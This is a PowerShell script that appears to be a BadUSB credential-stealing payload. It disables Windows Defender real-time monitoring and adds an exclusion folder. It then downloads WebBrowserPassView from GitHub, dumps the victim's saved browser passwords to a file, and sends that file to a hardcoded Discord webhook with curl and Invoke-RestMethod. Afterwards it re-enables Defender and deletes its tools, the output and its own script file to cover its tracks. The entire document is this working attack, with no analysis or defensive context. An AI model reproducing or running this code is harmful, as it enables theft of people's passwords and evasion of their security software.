function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1103770625807495268/HPCqKHhV5TbWTpg5VibrXPYFRqMFoOmm_HAcUAVTHef8PSz0xiEKxbCX-BvimV3fK6Y1'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

$random = -join ((48..57) | Get-Random -Count 3 | ForEach-Object {[char]$_})

mkdir C:/Payloads
Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -ExclusionPath "C:/Payloads"
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile "C:/Payloads/WebBrowserPassView.exe"

Start-Sleep -seconds 3

Set-Location C:\payloads
.\WebBrowserPassView.exe /stext passwords-$env:UserName$random.txt

Start-Sleep -seconds 10


Upload-Discord -file "passwords-$env:UserName$random.txt"

Start-Sleep -seconds 1

Set-MpPreference -DisableRealtimeMonitoring 0

Remove-Item WebBrowserPassView.exe
Remove-Item passwords-$env:UserName$random.txt
cd..
Remove-Item payloads
Remove-Item C:\Users\$env:UserName\appdata\local\temp\passview.ps1
exit
